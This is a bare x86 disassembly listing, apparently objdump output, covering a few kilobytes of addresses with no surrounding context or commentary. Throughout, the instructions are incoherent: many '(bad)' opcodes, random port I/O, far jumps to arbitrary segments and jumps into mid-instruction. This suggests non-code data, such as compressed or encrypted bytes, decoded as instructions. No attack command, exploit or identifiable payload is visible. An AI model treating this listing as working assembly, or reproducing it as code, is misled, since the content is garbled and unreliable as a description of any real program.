  431f33:	xchg   ebx,eax
  431f34:	xor    esi,ebp
  431f36:	xchg   ecx,eax
  431f37:	scas   eax,DWORD PTR es:[edi]
  431f38:	or     eax,0xda074f84
  431f3d:	xchg   esp,eax
  431f3e:	cmp    dh,BYTE PTR [eax+0x26]
  431f41:	dec    ebx
  431f42:	arpl   WORD PTR [eax+0x36],bx
  431f45:	fnstcw WORD PTR [esi+0x43]
  431f48:	jnp    0x431f65
  431f4a:	in     al,0x2f
  431f4c:	sub    eax,0xbbd027f4
  431f51:	pop    ebx
  431f52:	in     al,0x5b
  431f54:	loopne 0x431f6a
  431f56:	jne    0x431f54
  431f58:	ret    0x2d79
  431f5b:	mov    gs,WORD PTR [eax]
  431f5d:	out    dx,eax
  431f5e:	fwait
  431f5f:	sub    edx,DWORD PTR [ebp+edi*1-0x4e]
  431f63:	push   esp
  431f64:	imul   ebx,DWORD PTR [edx+0x34],0xdb5801de
  431f6b:	mov    DWORD PTR [edi+0x568ae49],0xc9da646
  431f75:	ja     0x431f56
  431f77:	mov    ch,0x32
  431f79:	push   ds
  431f7a:	xlat   BYTE PTR ds:[ebx]
  431f7b:	lock ss jae 0x431f40
  431f7f:	or     esi,ebp
  431f81:	add    BYTE PTR [esi+0x13],0xb2
  431f85:	outs   dx,BYTE PTR ds:[esi]
  431f86:	adc    dl,BYTE PTR [edi-0x775e50c]
  431f8c:	shr    BYTE PTR [ecx+0xaeaa964],cl
  431f92:	adc    cl,cl
  431f94:	push   ss
  431f95:	or     eax,DWORD PTR [edx]
  431f97:	pop    eax
  431f98:	nop
  431f99:	ss into 
  431f9b:	xor    eax,0xffffffdb
  431f9e:	(bad)  
  431f9f:	loopne 0x431fec
  431fa1:	cmp    dh,BYTE PTR [edi-0x28]
  431fa4:	adc    ebp,DWORD PTR [ebx+0x6928500c]
  431faa:	push   es
  431fab:	jp     0x43202b
  431fad:	push   edx
  431fae:	scas   al,BYTE PTR es:[edi]
  431faf:	and    ch,dh
  431fb1:	or     BYTE PTR [esi+0x6e8a3194],0xfe
  431fb8:	and    al,0xab
  431fba:	or     ebp,DWORD PTR [edx]
  431fbc:	lock mov edi,0x5078601c
  431fc2:	test   ebx,esp
  431fc4:	mov    eax,ds:0x25757807
  431fc9:	imul   esp,DWORD PTR [ecx-0x63],0x13
  431fcd:	xchg   ecx,eax
  431fce:	mov    eax,ds:0x783120b
  431fd3:	call   0x2227c7bf
  431fd8:	call   0xca6655e3
  431fdd:	call   0xbfeb:0x6c9d6416
  431fe4:	push   cs
  431fe5:	loope  0x432025
  431fe7:	les    ebx,FWORD PTR [esp+eiz*8-0x1974d4e4]
  431fee:	std    
  431fef:	div    BYTE PTR [edx+0x60]
  431ff2:	jnp    0x432024
  431ff4:	js     0x431fd2
  431ff6:	(bad)  
  431ff7:	bound  ebx,QWORD PTR [edi-0x2a4850fc]
  431ffd:	sub    BYTE PTR [edx+0x18354d85],dh
  432003:	iret   
  432004:	xchg   edi,eax
  432005:	pop    ds
  432006:	jo     0x431f8d
  432008:	inc    esp
  432009:	aaa    
  43200a:	add    DWORD PTR [edi-0x38],esi
  43200d:	in     al,0x71
  43200f:	lods   eax,DWORD PTR ds:[esi]
  432010:	sub    ecx,esi
  432012:	in     al,dx
  432013:	lahf   
  432014:	jmp    0xbd27:0x5897885
  43201b:	int    0x47
  43201d:	jmp    0xd55e:0x2dfbec58
  432024:	jg     0x43202f
  432026:	imul   edi,DWORD PTR [ebx+0x75cafb23],0xffffffb3
  43202d:	ins    BYTE PTR es:[edi],dx
  43202e:	out    0xb0,eax
  432030:	inc    edx
  432031:	lea    ebx,[edi-0x1c395b05]
  432037:	cdq    
  432038:	je     0x432057
  43203a:	int    0x35
  43203c:	sti    
  43203d:	jno    0x432036
  43203f:	daa    
  432040:	pop    ecx
  432041:	inc    esi
  432042:	xchg   DWORD PTR [edx-0x577636cb],eax
  432048:	imul   esp
  43204a:	xor    eax,0x8916d9d1
  43204f:	mov    eax,0xbcbe88ee
  432054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432055:	xor    BYTE PTR cs:[eax],ch
  432058:	jne    0x432029
  43205a:	loope  0x432061
  43205c:	test   BYTE PTR [eax+0x30],0x54
  432060:	iret   
  432061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432062:	retf   
  432063:	or     al,0x8b
  432065:	leave  
  432066:	icebp  
  432067:	pop    edx
  432068:	fidivr DWORD PTR [ecx+0x1bcab09f]
  43206e:	dec    esi
  43206f:	jge    0x4320a7
  432071:	sbb    cl,BYTE PTR [esi]
  432073:	hlt    
  432074:	pop    ss
  432075:	lods   al,BYTE PTR ds:[esi]
  432076:	ss sbb al,0xa8
  432079:	pop    esp
  43207a:	push   0xffffffdf
  43207c:	dec    ebp
  43207d:	pop    ds
  43207e:	loop   0x43202d
  432080:	mov    WORD PTR [edi-0x3a],?
  432083:	out    dx,eax
  432084:	cdq    
  432085:	dec    esi
  432086:	mov    ss,WORD PTR [edi-0x895f419]
  43208c:	jo     0x432076
  43208e:	cmp    al,0xa
  432090:	dec    esi
  432091:	(bad)  
  432092:	adc    DWORD PTR [edx-0x57],eax
  432095:	cmp    eax,0x4235b44b
  43209a:	mov    esp,0x8c0be17
  43209f:	cmp    DWORD PTR [ecx-0x34b23cc9],edi
  4320a5:	bound  ebx,QWORD PTR ds:0xcfd38ce9
  4320ab:	or     BYTE PTR ds:[edi],ch
  4320ae:	pop    esp
  4320af:	adc    eax,0x2af1c924
  4320b4:	cmp    DWORD PTR [ecx+0x27882f9f],esp
  4320ba:	inc    eax
  4320bb:	pop    ebp
  4320bc:	pop    ds
  4320bd:	mov    al,0x6f
  4320bf:	cmp    bh,BYTE PTR [esi]
  4320c1:	sbb    DWORD PTR [ebp+0x44e3ff5f],edx
  4320c7:	retf   0xc7c6
  4320ca:	cdq    
  4320cb:	mov    ah,0xc1
  4320cd:	cmp    eax,0x547139f9
  4320d2:	pop    esi
  4320d3:	push   ecx
  4320d4:	sbb    al,0xd1
  4320d6:	and    DWORD PTR [edi],ecx
  4320d8:	mov    gs,WORD PTR [ebx-0x58]
  4320db:	hlt    
  4320dc:	ret    0xd2b8
  4320df:	out    dx,eax
  4320e0:	call   0x858de1e6
  4320e5:	imul   edx,DWORD PTR [esp-0x31],0xebcf7577
  4320ed:	jno    0x4320d5
  4320ef:	(bad)  
  4320f0:	pop    edx
  4320f1:	push   ss
  4320f2:	sub    DWORD PTR [ebp-0x6d],ecx
  4320f5:	mov    BYTE PTR [ecx-0x5b],bh
  4320f8:	cwde   
  4320f9:	cmp    bh,BYTE PTR [ebx+0x14b5e7a9]
  4320ff:	arpl   WORD PTR [eax+0x43],di
  432102:	in     eax,0x92
  432104:	lahf   
  432105:	mov    esp,0x23209272
  43210a:	cmp    BYTE PTR [edx-0x36],dh
  43210d:	or     esi,DWORD PTR [ebx]
  43210f:	cmp    eax,0xdf90d77
  432114:	ja     0x4320f8
  432116:	rcl    DWORD PTR [ebx+ebp*4+0x20013cba],1
  43211d:	mov    ds:0x215ae864,eax
  432122:	out    0xbe,eax
  432124:	cmp    dl,0xa5
  432127:	out    0x87,eax
  432129:	out    0x25,eax
  43212b:	xor    al,0xa4
  43212d:	jo     0x4320c8
  43212f:	jno    0x432167
  432131:	loop   0x4320e5
  432133:	popa   
  432134:	js     0x43212a
  432136:	mov    al,0x60
  432138:	push   esp
  432139:	pusha  
  43213a:	cli    
  43213b:	mov    ds:0x27ad40fe,al
  432140:	and    ecx,ebx
  432142:	out    dx,eax
  432143:	sub    al,BYTE PTR [edi+0x31]
  432146:	or     ebp,DWORD PTR [eax+eax*1-0x64]
  43214a:	inc    ebp
  43214b:	pushf  
  43214c:	pop    ebx
  43214d:	or     DWORD PTR [edi-0xc9a4177],esp
  432153:	or     esi,DWORD PTR [esp+edx*2+0x3a545b28]
  43215a:	xchg   ebp,eax
  43215b:	xchg   ebp,ecx
  43215d:	cwde   
  43215e:	icebp  
  43215f:	push   edi
  432160:	mov    eax,ds:0x29313197
  432165:	inc    BYTE PTR [edi]
  432167:	repz mov cl,BYTE PTR [bx+di+0x69]
  43216c:	or     al,0x10
  43216e:	dec    ebx
  43216f:	jae    0x4321ac
  432171:	xchg   esi,eax
  432172:	stos   DWORD PTR es:[edi],eax
  432173:	add    ebp,esi
  432175:	fisubr DWORD PTR [edx]
  432177:	adc    ebx,DWORD PTR [esi+ebx*8]
  43217a:	xor    DWORD PTR [ecx-0x229b9991],esp
  432180:	push   ebp
  432181:	inc    ebx
  432182:	test   eax,0x46640b48
  432187:	fstp   QWORD PTR [edi-0x41]
  43218a:	jg     0x4321c2
  43218c:	mov    esp,?
  43218e:	pop    ecx
  43218f:	inc    esp
  432190:	push   ebp
  432191:	outs   dx,BYTE PTR ds:[esi]
  432192:	leave  
  432193:	push   cs
  432194:	jge    0x432212
  432196:	sbb    DWORD PTR [edi+0x53],0x78
  43219a:	sub    dh,al
  43219c:	pop    ebx
  43219d:	pop    ebx
  43219e:	push   ecx
  43219f:	out    0x54,al
  4321a1:	jmp    0x107f:0x4a615a64
  4321a8:	leave  
  4321a9:	pop    edi
  4321aa:	push   eax
  4321ab:	bound  ebx,QWORD PTR [esi+0x6ba80b79]
  4321b1:	call   0x6a87b1e2
  4321b6:	rcr    BYTE PTR ds:0x2baa05b8,0x3d
  4321bd:	jne    0x43222a
  4321bf:	outs   dx,DWORD PTR ds:[esi]
  4321c0:	fidiv  DWORD PTR [edi+esi*4+0x43]
  4321c4:	or     BYTE PTR ds:0xeb97881a,dl
  4321ca:	sub    eax,0x9fdfc6c6
  4321cf:	mov    ebp,edi
  4321d1:	std    
  4321d2:	sub    eax,0x61068449
  4321d7:	xchg   DWORD PTR [ebx],edx
  4321d9:	scas   al,BYTE PTR es:[edi]
  4321da:	inc    ebp
  4321db:	js     0x432184
  4321dd:	xchg   esp,eax
  4321de:	jecxz  0x432216
  4321e0:	inc    ebp
  4321e1:	add    eax,0x4fa7806d
  4321e6:	test   al,0x1e
  4321e8:	(bad)  
  4321e9:	addr16 mov esi,0xc5866ecc
  4321ef:	xor    ah,BYTE PTR [edx]
  4321f1:	(bad)  
  4321f2:	mov    ecx,0xe6403102
  4321f7:	xchg   ecx,eax
  4321f8:	(bad)  
  4321f9:	pop    ecx
  4321fa:	mov    dl,BYTE PTR [ebp-0x66294d0f]
  432200:	retf   
  432201:	fnsave [eax]
  432203:	pop    ebp
  432204:	and    al,0x65
  432206:	hlt    
  432207:	fcom   st(3)
  432209:	mov    edi,0x366ab309
  43220e:	scas   al,BYTE PTR es:[edi]
  43220f:	and    dl,BYTE PTR [eax]
  432211:	sub    ebp,ebx
  432213:	xchg   ebp,eax
  432214:	dec    ecx
  432215:	mov    ax,0x5ea
  432219:	jno    0x432220
  43221b:	repnz pusha 
  43221d:	lods   eax,DWORD PTR ds:[esi]
  43221e:	cld    
  43221f:	icebp  
  432220:	and    eax,0x471666bc
  432225:	mov    BYTE PTR [edx],0x8a
  432228:	jg     0x43226e
  43222a:	dec    ebp
  43222b:	add    eax,DWORD PTR [ebp+0x2d]
  43222e:	cmp    bl,al
  432230:	rcl    BYTE PTR [esi-0x78],1
  432233:	push   ebx
  432234:	les    ebp,FWORD PTR [ebx+eiz*8-0x40]
  432238:	jne    0x4321bf
  43223a:	add    DWORD PTR [ecx],eax
  43223c:	mov    ah,0xe1
  43223e:	or     eax,0x5d66b48a
  432243:	mov    bl,0x5a
  432245:	bound  ebx,QWORD PTR [esi]
  432247:	(bad)  
  432249:	dec    esp
  43224a:	lock push edx
  43224c:	and    bh,bh
  43224e:	es xchg ecx,eax
  432250:	push   cs
  432251:	repz into 
  432253:	cmp    ecx,edx
  432255:	push   0x46
  432257:	fst    st(3)
  432259:	push   ss
  43225a:	pop    edi
  43225b:	fwait
  43225c:	jl     0x4322b1
  43225e:	sbb    DWORD PTR [ebp-0x21],esp
  432261:	lock mov dh,0x2b
  432264:	daa    
  432265:	lds    esp,FWORD PTR [eax+ecx*8]
  432268:	(bad)  
  432269:	loopne 0x4322b4
  43226b:	out    dx,al
  43226c:	xor    eax,0x9d5da33d
  432271:	in     eax,dx
  432272:	adc    ebx,ebx
  432274:	pop    esp
  432275:	adc    DWORD PTR [eax-0x4448b043],esp
  43227b:	push   0x1c
  43227d:	fs pop ebx
  43227f:	adc    eax,0x2016aed0
  432284:	jp     0x432206
  432286:	ss sbb eax,0x39fcc15e
  43228c:	test   eax,0x5bb91fcc
  432291:	cmp    ebx,0xeac4f38a
  432297:	repnz add DWORD PTR [edx+ecx*8+0x2199335c],0x50
  4322a0:	and    ah,dl
  4322a2:	xchg   edi,eax
  4322a3:	dec    eax
  4322a4:	ds xor edi,ebx
  4322a7:	jb     0x432326
  4322a9:	xchg   al,bh
  4322ab:	repz sar BYTE PTR ds:[eax+0x4e4c3971],0x9
  4322b4:	les    edx,FWORD PTR [eax+0x47fea398]
  4322ba:	jg     0x4322d2
  4322bc:	ja     0x4322c8
  4322be:	retf   0x9264
  4322c1:	(bad)  
  4322c2:	lods   eax,DWORD PTR ds:[esi]
  4322c3:	mov    cl,0x52
  4322c5:	aas    
  4322c6:	mov    esi,0x6042d50e
  4322cb:	(bad)  
  4322cc:	or     DWORD PTR [ebp-0x22],ecx
  4322cf:	call   0xc5a09d95
  4322d4:	(bad)  
  4322d5:	repz fild DWORD PTR [ebp+0x73]
  4322d9:	out    0xa,al
  4322db:	lea    edx,[esi+0x5a]
  4322de:	cmp    esi,0xa323d9cd
  4322e4:	sub    DWORD PTR [ebp+0x21],ebp
  4322e7:	ins    DWORD PTR es:[edi],dx
  4322e8:	ficom  WORD PTR [eax+esi*8+0x30]
  4322ec:	outs   dx,BYTE PTR ds:[esi]
  4322ed:	xor    DWORD PTR [ebx-0x5],0x8c71264a
  4322f4:	jl     0x4322b0
  4322f6:	or     ah,BYTE PTR [ecx-0x35]
  4322f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4322fa:	das    
  4322fb:	sbb    DWORD PTR ds:0xfef387fb,0xfffffff5
  432302:	scas   al,BYTE PTR es:[edi]
  432303:	adc    eax,0xad51913c
  432308:	pop    esi
  432309:	pushw  es
  43230b:	dec    ecx
  43230c:	mov    bl,0xa0
  43230e:	sub    eax,0xa4c5c4c7
  432313:	push   esp
  432314:	adc    eax,0xd547cfdf
  432319:	sar    DWORD PTR ds:[edx+ebx*8-0x5f],0xd0
  43231f:	dec    edi
  432320:	inc    eax
  432321:	jmp    0x4322e9
  432323:	retf   0x822f
  432326:	leave  
  432327:	adc    al,0xd5
  432329:	sbb    esi,DWORD PTR [ebx]
  43232b:	xchg   BYTE PTR [esi-0x3ce47157],ch
  432331:	adc    dl,BYTE PTR [ecx+0x57dbc01f]
  432337:	out    0xc7,eax
  432339:	pop    esp
  43233a:	inc    ebp
  43233b:	or     ah,BYTE PTR [ebx-0x4f996bd6]
  432341:	pop    esp
  432342:	xchg   esp,eax
  432343:	retf   
  432344:	or     BYTE PTR [edi-0x7e],dh
  432347:	sub    ebx,ebx
  432349:	mov    eax,0x5796c7fd
  43234e:	leave  
  43234f:	lock imul edi,DWORD PTR [esi+0x29],0x1e87983c
  432357:	push   ecx
  432358:	xor    bh,BYTE PTR [ecx-0x7]
  43235b:	stos   DWORD PTR es:[edi],eax
  43235c:	ret    0x753a
  43235f:	aaa    
  432360:	sub    al,0x92
  432362:	dec    ecx
  432363:	xor    eax,0xdc1e845a
  432368:	push   0x7e
  43236a:	mov    ch,0xf
  43236c:	jbe    0x432334
  43236e:	fidivr WORD PTR [eax]
  432370:	sahf   
  432371:	out    dx,eax
  432372:	or     al,0x56
  432374:	(bad)  
  432376:	fwait
  432377:	lods   eax,DWORD PTR ds:[esi]
  432378:	mov    ds:0xf96632d1,al
  43237d:	cld    
  43237e:	push   eax
  43237f:	jp     0x432384
  432381:	cmp    BYTE PTR ds:0xe67de271,0x14
  432388:	hlt    
  432389:	pop    ecx
  43238a:	push   ss
  43238b:	push   ss
  43238c:	inc    eax
  43238d:	sub    al,0x22
  43238f:	ret    0xb131
  432392:	jbe    0x43240f
  432394:	xlat   BYTE PTR ds:[ebx]
  432395:	mov    ds,WORD PTR gs:[edx]
  432398:	pop    esi
  432399:	out    dx,al
  43239a:	cs je  0x43240b
  43239d:	pushf  
  43239e:	mov    ss,WORD PTR [ebp+0xa15f1b6]
  4323a4:	retf   0xcb9e
  4323a7:	ss ja  0x4323ad
  4323aa:	jg     0x4323ee
  4323ac:	xor    eax,0xcacd7c45
  4323b1:	jp     0x43234b
  4323b3:	arpl   WORD PTR [eax+edx*2+0x11],di
  4323b7:	mov    al,ds:0x818d49dd
  4323bc:	adc    bh,BYTE PTR [ebx-0x45]
  4323bf:	sbb    BYTE PTR [ebx],ch
  4323c1:	out    0x18,eax
  4323c3:	jle    0x432369
  4323c5:	cdq    
  4323c6:	dec    esi
  4323c7:	mov    eax,0x7958ec7c
  4323cc:	bound  ebp,QWORD PTR [ecx]
  4323ce:	mov    ebp,edi
  4323d0:	dec    ecx
  4323d1:	bound  eax,QWORD PTR [ebp+0x7a]
  4323d4:	scas   al,BYTE PTR es:[edi]
  4323d5:	into   
  4323d6:	xchg   edi,eax
  4323d7:	bound  ecx,QWORD PTR [ecx+0x6cb1721a]
  4323dd:	imul   edx,edi,0x3d
  4323e0:	mov    es,esi
  4323e2:	push   edx
  4323e3:	cmp    eax,0xd8f520ef
  4323e8:	test   BYTE PTR [edx-0xb],dl
  4323eb:	(bad)  
  4323ec:	jecxz  0x43243b
  4323ee:	mov    ss:0x58c87bb9,eax
  4323f4:	or     BYTE PTR [ebp+0x6c],0x6f
  4323f8:	and    DWORD PTR [ecx-0x1186098c],edi
  4323fe:	lods   eax,DWORD PTR ds:[esi]
  4323ff:	call   0x49a:0xf093cac
  432406:	pop    edx
  432407:	push   ss
  432408:	xchg   ecx,eax
  432409:	popa   
  43240a:	loop   0x4323bc
  43240c:	pop    esp
  43240d:	jo     0x432453
  43240f:	div    dh
  432411:	ret    
  432412:	in     eax,0x7d
  432414:	xlat   BYTE PTR ds:[ebx]
  432415:	lea    edx,[eax+0x35]
  432418:	pop    edi
  432419:	push   0xffffffdf
  43241b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43241c:	mov    WORD PTR [edx-0x6368a99b],es
  432422:	fistp  QWORD PTR [ecx+0x6b4662ab]
  432428:	outs   dx,DWORD PTR ds:[esi]
  432429:	test   DWORD PTR [eax],esp
  43242b:	pmullw mm2,QWORD PTR [edi-0x54]
  43242f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432430:	fcom   QWORD PTR [ecx]
  432432:	jl     0x432446
  432434:	int3   
  432435:	dec    edi
  432436:	clc    
  432437:	lods   al,BYTE PTR ds:[esi]
  432438:	mov    ebx,0x863beea0
  43243d:	xlat   BYTE PTR ds:[ebx]
  43243e:	aas    
  43243f:	adc    DWORD PTR [edx],edi
  432441:	fcomp  DWORD PTR [eax-0x64cd0935]
  432447:	pop    ebx
  432448:	(bad)  
  432449:	mov    ds:0xa4134271,al
  43244e:	cmp    DWORD PTR [edx],esi
  432450:	sbb    esp,ebx
  432452:	push   ds
  432453:	mov    ch,0xb7
  432455:	sbb    DWORD PTR [ebp+0x60],ecx
  432458:	(bad)  
  432459:	pop    ecx
  43245a:	jne    0x43243c
  43245c:	aad    0x7c
  43245e:	ins    DWORD PTR es:[edi],dx
  43245f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432460:	cmp    edi,0x56c9adc4
  432466:	dec    esp
  432467:	xor    al,BYTE PTR [esi+ecx*2]
  43246a:	repz pushf 
  43246c:	les    ebp,FWORD PTR [esi-0x74d6860]
  432472:	mov    ecx,0xffcefbba
  432477:	(bad)  
  432479:	and    DWORD PTR [ebx-0x106d62c1],esp
  43247f:	jmp    0x29ef:0xfdd04849
  432486:	xchg   ebx,eax
  432487:	xor    cl,BYTE PTR [edx]
  432489:	mov    cl,0x43
  43248b:	mov    ds:0xfe621f72,al
  432490:	mov    ebx,0xcc503b8d
  432495:	shr    DWORD PTR [edx+0x55a701fe],0x3c
  43249c:	jecxz  0x432432
  43249e:	fidiv  WORD PTR [ecx-0x4e65e2fa]
  4324a4:	xor    eax,0x7b7b2165
  4324a9:	sbb    ebx,DWORD PTR [edx+0x6e3716d9]
  4324af:	sub    eax,0x9bb8592d
  4324b4:	daa    
  4324b5:	sub    eax,0x3560ce8a
  4324ba:	and    ah,BYTE PTR [eax+0x7d]
  4324bd:	mov    bh,0xea
  4324bf:	ss sahf 
  4324c1:	jp     0x4324d9
  4324c3:	les    edi,FWORD PTR [esi+0x4c412e47]
  4324c9:	retf   0xf2f4
  4324cc:	mov    bh,0xb9
  4324ce:	dec    esp
  4324cf:	inc    edx
  4324d0:	and    eax,0x10542851
  4324d5:	cmp    eax,0x859b96c7
  4324da:	jecxz  0x4324f7
  4324dc:	mov    edi,0xb4aca816
  4324e1:	ret    
  4324e2:	int    0x99
  4324e4:	sar    BYTE PTR [eax+0x34dfbc2d],0x72
  4324eb:	mov    bl,0x7f
  4324ed:	mov    esi,DWORD PTR [ecx-0x2ef87a88]
  4324f3:	or     bh,BYTE PTR [ebx-0x6dd82f11]
  4324f9:	(bad)  [eax+0x3082cf59]
  4324ff:	es fs addr16 inc esp
  432503:	in     al,dx
  432504:	bound  edx,QWORD PTR [ebp-0x65]
  432507:	out    0xe3,al
  432509:	mov    ebp,0xf3982e5
  43250e:	push   eax
  43250f:	sbb    ah,BYTE PTR [ebx-0x5c6a5db9]
  432515:	imul   ebx,DWORD PTR [esi+0x31],0x25
  432519:	mov    bl,0x6f
  43251b:	pop    eax
  43251c:	jbe    0x432532
  43251e:	imul   esp,edx,0x3d96efa4
  432524:	(bad)  
  432527:	mov    WORD PTR [ebp+0x47],es
  43252a:	fistp  WORD PTR [edx+eax*1]
  43252d:	jb     0x432520
  43252f:	call   0x56da0790
  432534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432535:	(bad)  [eax]
  432537:	jbe    0x4324c0
  432539:	dec    ebp
  43253a:	or     dh,bl
  43253c:	and    DWORD PTR [eax+0x12052042],edi
  432542:	and    dh,ch
  432544:	push   0x56acd8ff
  432549:	inc    esi
  43254a:	je     0x4324f5
  43254c:	mov    ds:0x4a55701c,al
  432551:	cmp    al,0x7c
  432553:	std    
  432554:	es and al,ch
  432557:	sbb    al,cl
  432559:	xchg   ebx,eax
  43255a:	mov    esp,0xe789564a
  43255f:	sbb    cl,bh
  432561:	push   edi
  432562:	mov    BYTE PTR [ebx+esi*1],0x29
  432566:	test   al,0xb8
  432568:	mov    ebx,0xb15b30c0
  43256d:	cmp    al,0xd7
  43256f:	adc    DWORD PTR [ecx],esp
  432571:	mov    dh,0xfd
  432573:	jmp    0x432533
  432575:	cmc    
  432576:	sub    eax,0xac8acc0e
  43257b:	aad    0x6e
  43257d:	mov    ds:0xe727228f,al
  432582:	sub    ebp,DWORD PTR [ebx-0x5e]
  432585:	mov    ch,0xba
  432587:	int3   
  432588:	mov    cs,WORD PTR [ebx-0x13eabfa6]
  43258e:	pop    edx
  43258f:	in     eax,0xfb
  432591:	popf   
  432592:	and    esi,DWORD PTR [edx+ecx*8+0x2a128eb6]
  432599:	in     al,0x15
  43259b:	mov    eax,ds:0x5fd3ca20
  4325a0:	push   ss
  4325a1:	mov    esi,0x26949c6d
  4325a6:	and    esp,edi
  4325a8:	mov    cs,WORD PTR [esi]
  4325aa:	repnz scas eax,DWORD PTR es:[edi]
  4325ac:	add    al,0x92
  4325ae:	xor    al,0x24
  4325b0:	bnd jno 0x432593
  4325b3:	dec    edx
  4325b4:	xchg   edx,eax
  4325b5:	fcmovne st,st(2)
  4325b7:	inc    ecx
  4325b8:	push   ebp
  4325b9:	sbb    edi,DWORD PTR [ebp+0x66]
  4325bc:	mov    edx,0xd6dbf43c
  4325c1:	cs fmul st(5),st
  4325c4:	cmp    dl,BYTE PTR [edx+0x23679f6f]
  4325ca:	pop    ebx
  4325cb:	sub    ax,sp
  4325ce:	pop    ebx
  4325cf:	mov    bh,0x9a
  4325d1:	jne    0x4325bd
  4325d3:	push   0x60839e01
  4325d8:	jmp    0x7cbe:0xbeb88a53
  4325df:	(bad)  
  4325e0:	out    dx,eax
  4325e1:	cmp    BYTE PTR [ebp+esi*1-0x193fb62a],bl
  4325e8:	lods   al,BYTE PTR ds:[esi]
  4325e9:	or     DWORD PTR [ecx],eax
  4325eb:	pop    edx
  4325ed:	cmp    BYTE PTR [eax],0xb5
  4325f0:	push   es
  4325f1:	jg     0x4325fb
  4325f3:	mov    ds:0xe99bd303,eax
  4325f8:	jb     0x43261e
  4325fa:	jmp    0x432673
  4325fc:	imul   edx,DWORD PTR [eax],0x8206641c
  432602:	repnz cmc 
  432604:	jge    0x432622
  432606:	sbb    eax,0x20b03af
  43260b:	add    eax,0xb4b2f81a
  432610:	test   ch,al
  432612:	mov    ebp,0x78a90a10
  432617:	retf   0x2ac
  43261a:	jge    0x4325bf
  43261c:	jae    0x4325ab
  43261e:	jne    0x4325f1
  432620:	and    ah,BYTE PTR [esp+0x56]
  432624:	gs cs pop ecx
  432627:	test   eax,0xd2ef6bb6
  43262c:	mov    esp,DWORD PTR [esi]
  43262e:	cmp    eax,0xed24c879
  432633:	adc    DWORD PTR [esi-0x2],esi
  432636:	dec    edi
  432637:	xlat   BYTE PTR ds:[ebx]
  432638:	inc    edi
  432639:	call   0xb922:0x4ed5722e
  432640:	sub    edx,DWORD PTR [edx]
  432642:	mov    dh,0xf8
  432644:	jp     0x432695
  432646:	in     al,0x11
  432648:	add    BYTE PTR [esi+0x21d4ef74],bl
  43264e:	push   ebx
  43264f:	pushf  
  432650:	stos   DWORD PTR es:[edi],eax
  432651:	leave  
  432652:	shr    eax,cl
  432654:	test   DWORD PTR [edi],edx
  432656:	cmp    al,0xd3
  432658:	out    0xa4,al
  43265a:	jl     0x4325f0
  43265c:	and    al,0xb9
  43265e:	or     esp,0x24
  432661:	xchg   edi,eax
  432662:	nop
  432663:	xchg   edx,eax
  432664:	fistp  QWORD PTR ss:[ebp-0x1b]
  432668:	dec    ebx
  432669:	imul   ebx,DWORD PTR [ebp+0x22be1a25],0xb3a8ddde
  432673:	add    eax,0xde77a690
  432678:	bound  esi,QWORD PTR [esp+ecx*1]
  43267b:	xor    eax,0xff2deee6
  432680:	push   ds
  432681:	loope  0x432624
  432683:	mov    dl,0xc
  432685:	and    eax,0x3d89ab50
  43268a:	aaa    
  43268b:	dec    edi
  43268c:	adc    BYTE PTR [ecx],bh
  43268e:	in     al,dx
  43268f:	xor    al,0x9f
  432691:	repnz enter 0xc152,0x15
  432696:	or     DWORD PTR [esi+edi*4-0x1],ebp
  43269a:	xor    eax,0x61ee7e8d
  43269f:	scas   al,BYTE PTR es:[edi]
  4326a0:	aaa    
  4326a1:	push   0xe
  4326a3:	jle    0x4326f0
  4326a5:	test   BYTE PTR [ecx+0x6b],ah
  4326a8:	imul   ecx,ebp,0xffffff9c
  4326ab:	add    DWORD PTR [ebx+0x74],ebx
  4326ae:	ss iret 
  4326b0:	fisub  WORD PTR [eax-0x74d114c2]
  4326b6:	sbb    eax,0xf245b4d7
  4326bb:	push   eax
  4326bc:	adc    esp,0xffffff8f
  4326bf:	push   edx
  4326c0:	jns    0x4326e4
  4326c2:	(bad)
  4326c6:	repnz mov cl,0xcd
  4326c9:	mov    dh,0x92
  4326cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4326cc:	adc    DWORD PTR [esi],esp
  4326ce:	mov    eax,ds:0x854820be
  4326d3:	push   eax
  4326d4:	imul   edx,ebp,0x8d64188f
  4326da:	arpl   bp,bx
  4326dc:	pusha  
  4326dd:	adc    eax,0x9404f149
  4326e2:	pushf  
  4326e3:	mov    cs,eax
  4326e5:	cmp    BYTE PTR [eax],al
  4326e7:	sahf   
  4326e8:	call   0x7b51c227
  4326ed:	xchg   edx,eax
  4326ee:	pusha  
  4326ef:	rcl    BYTE PTR [ebx+0x32701d03],cl
  4326f5:	mov    ds:0xa7fb922b,ax
  4326fb:	dec    ecx
  4326fc:	pop    es
  4326fd:	push   edi
  4326fe:	mov    bl,0x2c
  432700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432701:	sbb    DWORD PTR [ebp+0x2],ebp
  432704:	pop    esp
  432705:	rcl    esi,cl
  432707:	in     eax,0x37
  432709:	sub    DWORD PTR [esi],edi
  43270b:	(bad)  
  43270c:	lock lods al,BYTE PTR ds:[esi]
  43270e:	outs   dx,BYTE PTR ds:[esi]
  43270f:	mov    eax,ds:0x4f2ab712
  432714:	mov    dl,0xd0
  432716:	leave  
  432717:	dec    esp
  432718:	pop    es
  432719:	push   ebx
  43271a:	out    dx,al
  43271b:	(bad)  
  43271c:	fmul   st(4),st
  43271e:	add    ebx,DWORD PTR [ecx+0x26e276e8]
  432724:	inc    edi
  432725:	adc    DWORD PTR [edx+eiz*8-0x5d229fa0],edi
  43272c:	sub    cl,BYTE PTR [ecx-0x48]
  43272f:	and    eax,0xf320bc58
  432734:	sahf   
  432735:	or     edi,DWORD PTR [ecx+0x5e]
  432738:	pop    eax
  432739:	ficomp WORD PTR [edi]
  43273b:	arpl   WORD PTR [ebp+0x1d4f0aef],dx
  432741:	push   eax
  432742:	sbb    esi,DWORD PTR [edx-0x1b]
  432745:	or     DWORD PTR [esi+0x26],0x69
  432749:	push   0x6b
  43274b:	and    DWORD PTR [ebx],0x33c31c89
  432751:	inc    esi
  432752:	or     eax,0xfe00af90
  432757:	or     eax,0xc58a3f8
  43275c:	jecxz  0x4327ae
  43275e:	jecxz  0x4326ff
  432760:	jo     0x432776
  432762:	cmp    al,0x7c
